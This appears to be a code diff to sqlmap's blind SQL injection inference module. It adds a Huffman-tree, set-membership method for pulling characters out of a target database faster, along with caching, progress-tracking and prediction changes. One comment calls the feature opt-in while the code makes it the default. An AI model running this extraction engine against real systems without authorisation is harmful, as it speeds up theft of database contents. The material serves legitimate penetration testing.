@@ -7,6 +7,7 @@ See the file 'LICENSE' for copying permission
 
 from __future__ import division
 
+import heapq
 import re
 import time
 
@@ -41,6 +42,10 @@ from lib.core.enums import PAYLOAD
 from lib.core.exception import SqlmapThreadException
 from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.core.settings import CHAR_INFERENCE_MARK
+from lib.core.settings import HUFFMAN_PROBE_LIMIT
+from lib.core.settings import HUFFMAN_PRIOR_WEIGHTS
+from lib.core.settings import PREDICTION_FEEDBACK_MAX_ITEMS
+from lib.core.settings import PREDICTION_FEEDBACK_MAX_LENGTH
 from lib.core.settings import INFERENCE_BLANK_BREAK
 from lib.core.settings import INFERENCE_EQUALS_CHAR
 from lib.core.settings import INFERENCE_GREATER_CHAR
@@ -64,6 +69,10 @@ from lib.utils.safe2bin import safecharencode
 from lib.utils.xrange import xrange
 from thirdparty import six
 
+# Sentinel returned by the opt-in Huffman retrieval (--huffman) meaning "this character is
+# outside the ASCII model (e.g. multi-byte/Unicode) - defer to the classic bisection".
+_HUFFMAN_FALLBACK = object()
+
 def bisection(payload, expression, length=None, charsetType=None, firstChar=None, lastChar=None, dump=False):
     """
     Bisection algorithm that can be used to perform blind SQL injection
@@ -80,7 +89,10 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
         return 0, None
 
     if charsetType is None and conf.charset:
-        asciiTbl = sorted(set(ord(_) for _ in conf.charset))
+        # conf.charset is fixed for the whole run; compute the table once, not per bisection() call
+        if kb.cache.charsetAsciiTbl is None:
+            kb.cache.charsetAsciiTbl = sorted(set(ord(_) for _ in conf.charset))
+        asciiTbl = kb.cache.charsetAsciiTbl
     else:
         asciiTbl = getCharset(charsetType)
 
@@ -127,10 +139,11 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
             expression = match.group(2).strip()
 
     try:
-        # Set kb.partRun in case "common prediction" feature (a.k.a. "good samaritan") is used or the engine is called from the API
+        # Set kb.partRun in case "common prediction" feature (a.k.a. "good samaritan") is used, or the
+        # engine is called from the API, or a JSON report is being collected (so enumeration output is tagged)
         if conf.predictOutput:
             kb.partRun = getPartRun()
-        elif conf.api:
+        elif conf.api or conf.reportJson:
             kb.partRun = getPartRun(alias=False)
         else:
             kb.partRun = None
@@ -152,6 +165,8 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
             lastChar = 0
         elif conf.lastChar is not None and (isinstance(conf.lastChar, int) or (hasattr(conf.lastChar, "isdigit") and conf.lastChar.isdigit())):
             lastChar = int(conf.lastChar)
+            if kb.fileReadMode:  # Note: file content is retrieved hex-encoded (2 chars per byte), mirroring the firstChar handling above
+                lastChar <<= 1
         elif hasattr(lastChar, "isdigit") and lastChar.isdigit() or isinstance(lastChar, int):
             lastChar = int(lastChar)
         else:
@@ -264,6 +279,95 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
             return result
 
+        def huffmanChar(idx):
+            """
+            Adaptive retrieval of a single character using set-membership ("... IN (...)")
+            questions driven by a Huffman tree built from an online frequency model of the data
+            retrieved so far (used by default for blind table dumps; '--no-huffman' disables it).
+            The expected number of requests approaches the
+            data's entropy (fewer on text/hex), while uniform/binary data yields a balanced tree
+            (i.e. no penalty versus the classic bisection).
+
+            Correctness does NOT depend on the (shared, racily updated) model: the tree is a
+            decision tree over the whole 0..127 range plus a dedicated ESCAPE leaf. At every node
+            the child that does NOT contain ESCAPE is the one tested, so any value outside 0..127
+            (e.g. multi-byte/Unicode) fails every membership test, lands on ESCAPE and is handed
+            back to the classic bisection. Returns the character, or None to fall back.
+            """
+            ESCAPE = -1
+            model = kb.huffmanModel
+
+            heap = []
+            for order, ordinal in enumerate(xrange(128)):
+                heapq.heappush(heap, (model.get(ordinal, 0) + HUFFMAN_PRIOR_WEIGHTS.get(ordinal, 1), order, (ordinal,)))
+            heapq.heappush(heap, (max(model.get(ESCAPE, 0), 1), 128, (ESCAPE,)))
+
+            counter = 129
+            while len(heap) > 1:
+                w1, _, n1 = heapq.heappop(heap)
+                w2, _, n2 = heapq.heappop(heap)
+                heapq.heappush(heap, (w1 + w2, counter, (n1, n2)))
+                counter += 1
+            node = heap[0][2]
+
+            def _concrete(n):
+                if len(n) == 1:
+                    return [] if n[0] == ESCAPE else [n[0]]
+                return _concrete(n[0]) + _concrete(n[1])
+
+            def _hasEscape(n):
+                return n[0] == ESCAPE if len(n) == 1 else (_hasEscape(n[0]) or _hasEscape(n[1]))
+
+            template = payload.replace("%s%s" % (INFERENCE_GREATER_CHAR, "%d"), " IN (%s)", 1)
+
+            while len(node) == 2:
+                left, right = node
+
+                if _hasEscape(left):
+                    testNode, otherNode = right, left
+                elif _hasEscape(right):
+                    testNode, otherNode = left, right
+                else:
+                    leftLeaves, rightLeaves = _concrete(left), _concrete(right)
+                    testNode, otherNode = (left, right) if len(leftLeaves) <= len(rightLeaves) else (right, left)
+
+                testSet = _concrete(testNode)
+                setExpr = ','.join(str(_) for _ in testSet)
+                forgedPayload = safeStringFormat(template, (expressionUnescaped, idx, setExpr))
+                result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
+                incrementCounter(getTechnique())
+
+                node = testNode if result else otherNode
+
+            value = node[0]
+
+            if value == ESCAPE:
+                model[ESCAPE] = model.get(ESCAPE, 0) + 1
+                return _HUFFMAN_FALLBACK
+
+            if value == 0:
+                # ORD(MID(..)) of an empty (past end-of-string) character is 0; mirror the classic
+                # bisection and signal end-of-string (do NOT pollute the model with the sentinel).
+                return None
+
+            # One-time safety validation: cross-check the first set-membership result with a short
+            # equality probe. Unlike the long IN() lists, a single '=N' comparison cannot be
+            # truncated/mangled by a parameter-length limit or a WAF, so it is a trustworthy oracle.
+            # If it disagrees, the IN() channel is unreliable here: latch the technique off so the
+            # classic '>' bisection takes over for the rest of the run (graceful fallback).
+            if not kb.huffmanValidated:
+                verifyPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, value))
+                verified = Request.queryPage(verifyPayload, timeBasedCompare=timeBasedCompare, raise404=False)
+                incrementCounter(getTechnique())
+                if verified:
+                    kb.huffmanValidated = True
+                else:
+                    kb.disableHuffman = True
+                    return _HUFFMAN_FALLBACK
+
+            model[value] = model.get(value, 0) + 1
+            return decodeIntToUnicode(value)
+
         def getChar(idx, charTbl=None, continuousOrder=True, expand=charsetType is None, shiftTable=None, retried=None):
             """
             continuousOrder means that distance between each two neighbour's
@@ -276,6 +380,21 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
             if result:
                 return result
+
+            if (not conf.noHuffman and not kb.disableHuffman and dump and continuousOrder and charsetType is None and not timeBasedCompare
+                    and ("%s%s" % (INFERENCE_GREATER_CHAR, "%d")) in payload
+                    and ("'%s'" % CHAR_INFERENCE_MARK) not in payload):
+                kb.huffmanProbes = (kb.huffmanProbes or 0) + 1
+                result = huffmanChar(idx)
+                if result is not _HUFFMAN_FALLBACK:
+                    return result
+                # huffman declined this character (Unicode/escape, or failed the validation probe).
+                # If the set-membership channel keeps escaping it is not paying off here (trimmed/
+                # blocked long payloads, or non-ASCII-heavy data) -> latch off so the classic '>'
+                # bisection takes over efficiently for the rest of the run.
+                kb.huffmanEscapes = (kb.huffmanEscapes or 0) + 1
+                if kb.huffmanProbes >= HUFFMAN_PROBE_LIMIT and kb.huffmanEscapes * 2 >= kb.huffmanProbes:
+                    kb.disableHuffman = True
 
             if charTbl is None:
                 charTbl = type(asciiTbl)(asciiTbl)
@@ -512,6 +631,8 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
             threadData.shared.value = [None] * length
             threadData.shared.index = [firstChar]    # As list for python nested function scoping
             threadData.shared.start = firstChar
+            threadData.shared.retrieved = 0
+            threadData.shared.endIndex = 0
 
             try:
                 def blindThread():
@@ -537,7 +658,11 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                             break
 
                         with kb.locks.value:
-                            threadData.shared.value[currentCharIndex - 1 - firstChar] = val
+                            idx = currentCharIndex - 1 - firstChar
+                            threadData.shared.value[idx] = val
+                            threadData.shared.retrieved += 1
+                            if idx > threadData.shared.endIndex:
+                                threadData.shared.endIndex = idx
                             currentValue = list(threadData.shared.value)
 
                         if kb.threadContinue:
@@ -545,24 +670,17 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                                 progress.progress(threadData.shared.index[0])
                             elif conf.verbose >= 1:
                                 startCharIndex = 0
-                                endCharIndex = 0
-
-                                for i in xrange(length):
-                                    if currentValue[i] is not None:
-                                        endCharIndex = max(endCharIndex, i)
+                                endCharIndex = threadData.shared.endIndex
 
                                 output = ''
 
                                 if endCharIndex > conf.progressWidth:
                                     startCharIndex = endCharIndex - conf.progressWidth
 
-                                count = threadData.shared.start
+                                count = threadData.shared.start + threadData.shared.retrieved
 
                                 for i in xrange(startCharIndex, endCharIndex + 1):
                                     output += '_' if currentValue[i] is None else filterControlChars(currentValue[i] if len(currentValue[i]) == 1 else ' ', replacement=' ')
-
-                                for i in xrange(length):
-                                    count += 1 if currentValue[i] is not None else 0
 
                                 if startCharIndex > 0:
                                     output = ".." + output[2:]
@@ -710,7 +828,17 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
         if finalValue is not None:
             finalValue = decodeDbmsHexValue(finalValue) if conf.hexConvert else finalValue
-            hashDBWrite(expression, finalValue)
+            if not (conf.firstChar or conf.lastChar):  # Note: --first/--last give a range-limited (non-complete) output; caching it unmarked would let a later resume serve the truncated value as the full one
+                hashDBWrite(expression, finalValue)
+
+            # Adaptive intra-run prediction (good samaritan / --predict-output): remember this extracted
+            # value for its enumeration context so later same-context items sharing structure are predicted
+            # faster. Length-capped (identifiers are short -> large data cells never bloat/pollute the pool);
+            # a wrong prediction only ever costs a probe and falls back to bisection.
+            if (conf.predictOutput and kb.partRun and kb.commonOutputs is not None
+                    and 0 < len(finalValue) <= PREDICTION_FEEDBACK_MAX_LENGTH
+                    and len(kb.commonOutputs.get(kb.partRun) or ()) < PREDICTION_FEEDBACK_MAX_ITEMS):
+                kb.commonOutputs.setdefault(kb.partRun, set()).add(finalValue)
         elif partialValue:
             hashDBWrite(expression, "%s%s" % (PARTIAL_VALUE_MARKER if not conf.hexConvert else PARTIAL_HEX_VALUE_MARKER, partialValue))
 
